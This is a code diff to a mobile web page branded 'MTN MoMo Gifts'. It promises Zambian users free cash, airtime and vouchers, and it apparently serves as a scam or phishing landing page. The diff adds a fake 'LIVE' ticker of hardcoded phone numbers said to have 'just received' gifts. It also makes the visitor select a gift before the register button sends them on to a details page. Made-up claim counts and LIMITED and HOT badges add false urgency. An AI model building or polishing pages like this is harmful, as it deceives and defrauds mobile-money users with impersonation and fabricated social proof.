@@ -26,6 +26,77 @@
             padding: 20px;
         }
         
+        /* ===== LIVE TICKER ===== */
+        .live-ticker {
+            width: 100%;
+            max-width: 480px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            border-radius: 12px;
+            padding: 10px 16px;
+            margin-bottom: 15px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 4px 15px rgba(0, 71, 171, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .live-ticker .live-badge {
+            background: #FFC100;
+            color: #1a1a2e;
+            font-size: 9px;
+            font-weight: 800;
+            padding: 2px 8px;
+            border-radius: 20px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .live-ticker .live-badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #1a1a2e;
+            border-radius: 50%;
+            display: inline-block;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .live-ticker .ticker-wrapper {
+            flex: 1;
+            overflow: hidden;
+            position: relative;
+            height: 20px;
+        }
+        
+        .live-ticker .ticker-text {
+            position: absolute;
+            white-space: nowrap;
+            color: white;
+            font-size: 12px;
+            font-weight: 500;
+            animation: tickerMove 20s linear infinite;
+        }
+        
+        @keyframes tickerMove {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        
+        /* ===== HEADER ===== */
         header {
             width: 100%;
             max-width: 480px;
@@ -62,6 +133,7 @@
             font-size: 14px;
         }
         
+        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
@@ -202,11 +274,6 @@
         .gift-card .badge.new {
             background: #f3e5f5;
             color: #6a1b9a;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
         }
         
         .gift-card .users {
@@ -371,7 +438,7 @@
             font-weight: 600;
         }
         
-        /* ===== NOTIFICATION ===== */
+        /* ===== NOTIFICATION POPUP ===== */
         .notification {
             position: fixed;
             bottom: 80px;
@@ -412,6 +479,8 @@
             .stat-item { padding: 10px 6px; }
             .register-box .box-title { font-size: 16px; }
             .register-box .register-btn { font-size: 15px; padding: 13px; }
+            .live-ticker { padding: 8px 12px; }
+            .live-ticker .ticker-text { font-size: 11px; }
         }
         
         @media (max-width: 380px) {
@@ -421,10 +490,23 @@
 </head>
 <body>
 
-    <!-- Notification -->
-    <div class="notification" id="notification"></div>
+    <!-- ===== LIVE TICKER ===== -->
+    <div class="live-ticker">
+        <div class="live-badge">
+            <span class="dot"></span>
+            LIVE
+        </div>
+        <div class="ticker-wrapper">
+            <div class="ticker-text" id="tickerText">
+                +260945781234 just received Cash Gift ZMW 1,856 • 
+                +260971235678 just received Airtime ZMW 179 • 
+                +260965412345 just received Data Bundle 5GB • 
+                +260978903456 just received Shopping Voucher ZMW 2,500 •
+            </div>
+        </div>
+    </div>
 
-    <!-- Header -->
+    <!-- ===== HEADER ===== -->
     <header>
         <button class="menu-btn" aria-label="Menu">☰</button>
         <div class="logo">
@@ -433,7 +515,7 @@
         <a href="login.html" class="login-link">Login</a>
     </header>
 
-    <!-- Main Content -->
+    <!-- ===== MAIN CARD ===== -->
     <div class="card">
         <h1 class="title">
             🎁 Get Free <span class="highlight">MoMo</span> <span class="highlight2">Gifts</span>
@@ -448,137 +530,126 @@
             
             <!-- Gift Grid - 18 Gifts -->
             <div class="gift-grid">
-                <!-- Row 1: Airtime & Data -->
-                <div class="gift-card" onclick="showGift('Airtime', 'ZMW 179')">
+                <div class="gift-card" onclick="selectGift('Airtime', 'ZMW 179', '📱', this)">
                     <span class="icon">📱</span>
                     <div class="name">Airtime</div>
                     <div class="value">ZMW 179</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 2.4k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Data Bundle', '5GB')">
+                <div class="gift-card" onclick="selectGift('Data Bundle', '5GB', '🌐', this)">
                     <span class="icon">🌐</span>
                     <div class="name">Data Bundle</div>
                     <div class="value">5GB</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 5.1k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Data Bundle Plus', '10GB')">
+                <div class="gift-card" onclick="selectGift('Data Bundle Plus', '10GB', '📶', this)">
                     <span class="icon">📶</span>
                     <div class="name">Data Bundle+</div>
                     <div class="value">10GB</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 3.8k claimed</div>
                 </div>
-                
-                <!-- Row 2: Cash & Vouchers -->
-                <div class="gift-card" onclick="showGift('Cash Reward', 'ZMW 1,856')">
+                <div class="gift-card" onclick="selectGift('Cash Reward', 'ZMW 1,856', '💰', this)">
                     <span class="icon">💰</span>
                     <div class="name">Cash Reward</div>
                     <div class="value">ZMW 1,856</div>
                     <span class="badge limited">LIMITED</span>
                     <div class="users"><span class="emoji">👤</span> 892 claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Shopping Voucher', 'ZMW 2,500')">
+                <div class="gift-card" onclick="selectGift('Shopping Voucher', 'ZMW 2,500', '🛒', this)">
                     <span class="icon">🛒</span>
                     <div class="name">Shopping Voucher</div>
                     <div class="value">ZMW 2,500</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 1.2k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Food Voucher', 'ZMW 1,200')">
+                <div class="gift-card" onclick="selectGift('Food Voucher', 'ZMW 1,200', '🍔', this)">
                     <span class="icon">🍔</span>
                     <div class="name">Food Voucher</div>
                     <div class="value">ZMW 1,200</div>
                     <span class="badge new">🆕 NEW</span>
                     <div class="users"><span class="emoji">👤</span> 456 claimed</div>
                 </div>
-                
-                <!-- Row 3: Entertainment -->
-                <div class="gift-card" onclick="showGift('Music Streaming', '3 Months')">
+                <div class="gift-card" onclick="selectGift('Music Streaming', '3 Months', '🎵', this)">
                     <span class="icon">🎵</span>
                     <div class="name">Music Streaming</div>
                     <div class="value">3 Months</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 3.7k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Video Bundle', '10GB')">
+                <div class="gift-card" onclick="selectGift('Video Bundle', '10GB', '📺', this)">
                     <span class="icon">📺</span>
                     <div class="name">Video Bundle</div>
                     <div class="value">10GB</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 1.8k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Gaming Bundle', 'ZMW 500')">
+                <div class="gift-card" onclick="selectGift('Gaming Bundle', 'ZMW 500', '🎮', this)">
                     <span class="icon">🎮</span>
                     <div class="name">Gaming Bundle</div>
                     <div class="value">ZMW 500</div>
                     <span class="badge new">🆕 NEW</span>
                     <div class="users"><span class="emoji">👤</span> 324 claimed</div>
                 </div>
-                
-                <!-- Row 4: More Gifts -->
-                <div class="gift-card" onclick="showGift('Social Media Bundle', '2GB')">
+                <div class="gift-card" onclick="selectGift('Social Media Bundle', '2GB', '📱', this)">
                     <span class="icon">📱</span>
                     <div class="name">Social Media</div>
                     <div class="value">2GB</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 4.2k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Night Data', '15GB')">
+                <div class="gift-card" onclick="selectGift('Night Data', '15GB', '🌙', this)">
                     <span class="icon">🌙</span>
                     <div class="name">Night Data</div>
                     <div class="value">15GB</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 2.1k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Weekend Bundle', '7GB')">
+                <div class="gift-card" onclick="selectGift('Weekend Bundle', '7GB', '🎉', this)">
                     <span class="icon">🎉</span>
                     <div class="name">Weekend Bundle</div>
                     <div class="value">7GB</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 1.9k claimed</div>
                 </div>
-                
-                <!-- Row 5: More Cash & Vouchers -->
-                <div class="gift-card" onclick="showGift('Fuel Voucher', 'ZMW 800')">
+                <div class="gift-card" onclick="selectGift('Fuel Voucher', 'ZMW 800', '⛽', this)">
                     <span class="icon">⛽</span>
                     <div class="name">Fuel Voucher</div>
                     <div class="value">ZMW 800</div>
                     <span class="badge limited">LIMITED</span>
                     <div class="users"><span class="emoji">👤</span> 567 claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Fashion Voucher', 'ZMW 1,500')">
+                <div class="gift-card" onclick="selectGift('Fashion Voucher', 'ZMW 1,500', '👗', this)">
                     <span class="icon">👗</span>
                     <div class="name">Fashion Voucher</div>
                     <div class="value">ZMW 1,500</div>
                     <span class="badge new">🆕 NEW</span>
                     <div class="users"><span class="emoji">👤</span> 234 claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Grocery Voucher', 'ZMW 2,000')">
+                <div class="gift-card" onclick="selectGift('Grocery Voucher', 'ZMW 2,000', '🛍️', this)">
                     <span class="icon">🛍️</span>
                     <div class="name">Grocery Voucher</div>
                     <div class="value">ZMW 2,000</div>
                     <span class="badge hot">🔥 HOT</span>
                     <div class="users"><span class="emoji">👤</span> 1.4k claimed</div>
                 </div>
-                
-                <!-- Row 6: Premium Gifts -->
-                <div class="gift-card" onclick="showGift('Movie Tickets', '2 Tickets')">
+                <div class="gift-card" onclick="selectGift('Movie Tickets', '2 Tickets', '🎬', this)">
                     <span class="icon">🎬</span>
                     <div class="name">Movie Tickets</div>
                     <div class="value">2 Tickets</div>
                     <span class="badge popular">⭐ POPULAR</span>
                     <div class="users"><span class="emoji">👤</span> 2.8k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Health Insurance', '1 Month')">
+                <div class="gift-card" onclick="selectGift('Health Insurance', '1 Month', '🏥', this)">
                     <span class="icon">🏥</span>
                     <div class="name">Health Insurance</div>
                     <div class="value">1 Month</div>
                     <span class="badge free">FREE</span>
                     <div class="users"><span class="emoji">👤</span> 1.1k claimed</div>
                 </div>
-                <div class="gift-card" onclick="showGift('Education Bundle', 'ZMW 3,000')">
+                <div class="gift-card" onclick="selectGift('Education Bundle', 'ZMW 3,000', '📚', this)">
                     <span class="icon">📚</span>
                     <div class="name">Education Bundle</div>
                     <div class="value">ZMW 3,000</div>
@@ -601,7 +672,7 @@
         </div>
     </div>
 
-    <!-- Stats -->
+    <!-- ===== STATS ===== -->
     <div class="card" style="padding: 20px;">
         <div class="stats">
             <div class="stat-item">
@@ -619,7 +690,7 @@
         </div>
     </div>
 
-    <!-- Features -->
+    <!-- ===== FEATURES ===== -->
     <div class="card" style="padding: 20px;">
         <div class="features">
             <div class="feature">
@@ -637,7 +708,7 @@
         </div>
     </div>
 
-    <!-- Bottom Navigation -->
+    <!-- ===== BOTTOM NAV ===== -->
     <div class="bottom-nav">
         <button class="nav-item active">
             <span class="icon">🏠</span>
@@ -658,6 +729,9 @@
         <a href="#" onclick="alert('Call 155 for support')">Help</a> • 
         <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
     </footer>
+
+    <!-- Notification Popup -->
+    <div class="notification" id="notification"></div>
 
     <script>
         // ============================================
@@ -690,35 +764,95 @@
         });
 
         // ============================================
-        // SHOW GIFT NOTIFICATION
+        // GIFT SELECTION
         // ============================================
-        function showGift(name, value) {
+        function selectGift(name, value, icon, element) {
+            // Store selected gift
+            localStorage.setItem('selectedGift', name);
+            localStorage.setItem('selectedGiftValue', value);
+            localStorage.setItem('selectedGiftIcon', icon);
+            
+            // Visual feedback
+            document.querySelectorAll('.gift-card').forEach(card => {
+                card.style.borderColor = '#e8ecf5';
+                card.style.background = 'white';
+            });
+            element.style.borderColor = '#0047AB';
+            element.style.background = '#f0f4ff';
+            
+            // Show notification
+            showNotification(`🎁 ${name} (${value}) selected! Click "CLAIM YOUR GIFT" to proceed.`);
+            
+            console.log('🎁 Gift selected:', name, '-', value);
+        }
+
+        // ============================================
+        // NOTIFICATION
+        // ============================================
+        function showNotification(message) {
             const notification = document.getElementById('notification');
-            notification.innerHTML = `🎁 <strong>${name}</strong> — ${value} <br><span style="font-weight:400;font-size:12px;opacity:0.8;">Click "CLAIM YOUR GIFT" to get it!</span>`;
+            notification.innerHTML = message;
             notification.style.display = 'block';
             
             clearTimeout(window.notificationTimeout);
             window.notificationTimeout = setTimeout(() => {
                 notification.style.display = 'none';
-            }, 4000);
+            }, 3000);
         }
 
         // ============================================
-        // REGISTER BUTTON - Goes to details.html
+        // REGISTER BUTTON - REQUIRES GIFT SELECTION
         // ============================================
         document.getElementById('registerBtn').addEventListener('click', function() {
-            localStorage.setItem('source', 'gifts');
+            const selectedGift = localStorage.getItem('selectedGift');
+            
+            if (!selectedGift) {
+                showNotification('⚠️ Please select a gift first by tapping on any gift card above!');
+                return;
+            }
+            
+            console.log('➡️ Proceeding with gift:', selectedGift);
             window.location.href = 'details.html';
         });
 
-        document.getElementById('notification').addEventListener('click', function() {
-            this.style.display = 'none';
-        });
+        // ============================================
+        // LIVE TICKER - Dynamic updates
+        // ============================================
+        const liveMessages = [
+            '+260945781234 just received Cash Gift ZMW 1,856',
+            '+260971235678 just received Airtime ZMW 179',
+            '+260965412345 just received Data Bundle 5GB',
+            '+260978903456 just received Shopping Voucher ZMW 2,500',
+            '+260967890123 just received Music Streaming 3 Months',
+            '+260952345678 just received Fuel Voucher ZMW 800',
+            '+260983456789 just received Grocery Voucher ZMW 2,000',
+            '+260974567890 just received Video Bundle 10GB',
+            '+260961234567 just received Food Voucher ZMW 1,200',
+            '+260999876543 just received Education Bundle ZMW 3,000',
+            '+260956789012 just received Fashion Voucher ZMW 1,500',
+            '+260988765432 just received Night Data 15GB',
+            '+260943210987 just received Gaming Bundle ZMW 500',
+            '+260975432109 just received Movie Tickets 2 Tickets',
+            '+260964321098 just received Health Insurance 1 Month'
+        ];
+
+        let tickerIndex = 0;
+        setInterval(() => {
+            const ticker = document.getElementById('tickerText');
+            if (ticker) {
+                tickerIndex = (tickerIndex + 1) % liveMessages.length;
+                ticker.textContent = liveMessages[tickerIndex] + ' • ' + 
+                    liveMessages[(tickerIndex + 1) % liveMessages.length] + ' • ' +
+                    liveMessages[(tickerIndex + 2) % liveMessages.length];
+            }
+        }, 5000);
 
         console.log('====================================');
         console.log('🎁 MTN MoMo Gifts - Homepage Loaded');
         console.log('📊 18 Gifts Available');
+        console.log('🔴 Live Ticker Active');
         console.log('====================================');
     </script>
+
 </body>
 </html>
